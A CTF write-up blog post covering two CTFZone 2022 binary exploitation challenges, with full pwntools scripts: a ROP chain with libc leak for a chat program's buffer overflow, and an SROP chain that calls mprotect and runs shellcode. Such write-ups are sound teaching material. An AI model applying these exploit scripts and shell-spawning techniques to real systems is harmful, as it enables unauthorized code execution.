---
title: CTFZone 2022
date: 2022-08-26 19:21:00
category: CTF Writeup
tags:
    - CTFZone
---

## OneChat

A message board chat program. Someone can leave a message and can view latest message. However, a buffer overflow happened in `add_message` function. Since no PIE and ASLR, a ROP chain can be made. 

Learned to use `LibcSearcher`, since the organizer didn't provide libc version in the challenge attatchment. 

EXP:

```python
from pwn import *
from LibcSearcher import *


context.arch = "amd64"
context.encoding = "latin"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST = "onechat.ctfz.one"
PORT = 1337
LOCAL = False
elf = ELF("./chat")

if LOCAL:
    p = elf.process()
    gdb.attach(p, """
            b *0x4013e0
            c
            """)
else:
    context.update(log_level="info")
    p = remote(HOST, PORT)

# Exploit starts here
p.sendlineafter('>', b'1')
p.sendlineafter('>', b'2')

elf_rop = ROP(elf)
pop_rdi = elf_rop.find_gadget(["pop rdi", "ret"]).address
pop_rsp = elf_rop.find_gadget(["pop rsp", "pop r13", "pop r14", "pop r15", "ret"]).address
pop_rbp = elf_rop.find_gadget(["pop rbp", "ret"]).address
p.sendlineafter('>', p64(elf.got["puts"]) + b'\x16\x10')
# p.sendlineafter('>', cyclic(500))
payload = b'\x40\x00\x00\x00\x00\x00' + flat(
        elf.plt["puts"],
        0x4010b0,
        b'A' * 0x68,
        # start of ROP chain
        pop_rdi,
        )
p.sendlineafter('>', payload)
p.read()
puts = u64(p.read()[:6] + b"\x00\x00")
print("LEAK: LIBC_PUTS", hex(puts))
libc = LibcSearcher('puts',puts)
libcbase = puts-libc.dump('puts')
info('libc->'+hex(libcbase))
system = libcbase+libc.dump('system')
info('system->'+hex(system))
binsh = libcbase+libc.dump('str_bin_sh')

p.sendline(b'1')
p.sendlineafter('>', b'1')
p.sendlineafter('>', b'2')

p.sendlineafter('>', p64(binsh) + b'\x16\x10')
payload2 = b'\x40\x00\x00\x00\x00\x00' + flat(
        system,
        b'B' * 0x70,
        # start of ROP chain
        pop_rdi,
        )
p.sendlineafter('>', payload2)


p.interactive()
```

## microp

A very simple program, just read in user input by `sys_read` and then return. First thing come up to mind is to take control of the syscalls by controling `rax`, which is the length of user input. However, I have no way to modify `rdi` to run `sys_execve`. 

After 2019's instruction, it is a classic [SROP](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming) challenge. We can use `sys_sigreturn` to trigger the signal frame and get control of all registers. Here we use `sys_mprotect` to modify the previlege of the program page to get shellcode execution. 

EXP:

```python
from pwn import *


context.arch = "amd64"
context.encoding = "latin"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST = "microp.ctfz.one"
PORT = 2228
LOCAL = False
elf = ELF("./microp")

if LOCAL:
    p = gdb.debug("./microp", "b *0x40105A\nc\nc\nc\nc")
else:
    context.update(log_level="info")
    p = remote(HOST, PORT)

# Exploit starts here
syscall = 0x401058
start = 0x401044
padding = 0x40

payload = b'A' * padding + p64(start) * 3
p.send(payload)
sleep(3)

# call mprotect make a page rwx
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_mprotect
sigframe.rdi = 0x400000
sigframe.rsi = 0x1000
sigframe.rdx = 0x7
sigframe.rsp = 0x400088
sigframe.rip = syscall

p.sendline(p64(start) + b'C' * 8 + p64(start) * 8 + p64(syscall) * 2 + bytes(sigframe)[8:])
sleep(3)
p.send(p64(start) + b'B' * 7)
sleep(3)
payload = b'A' * padding + p64(0x400090) + asm(shellcraft.sh())
p.sendline(payload)

p.interactive()
```
